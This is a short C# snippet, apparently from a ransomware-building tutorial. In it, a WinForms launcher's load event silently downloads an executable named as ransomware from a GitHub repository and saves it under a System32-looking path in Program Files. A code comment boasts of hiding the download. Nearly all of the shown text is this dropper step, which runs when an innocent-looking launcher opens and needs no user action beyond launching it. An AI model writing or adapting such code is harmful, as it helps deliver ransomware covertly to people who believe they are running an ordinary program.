...
namespace launcher2._0
{
    public partial class launcher2 : Form
    {
        ...
        private void launcher2_Load(object sender, EventArgs e)
        {
            ...
            webClient.DownloadFile("https://github.com/Clutter-Test/Ransom_File_For_Tutorial/raw/master/Rasomware2.0.exe", @"C:\Program Files\System32\Ransomware2.0.exe"); //Hide donwloading :-), but I show you more later...
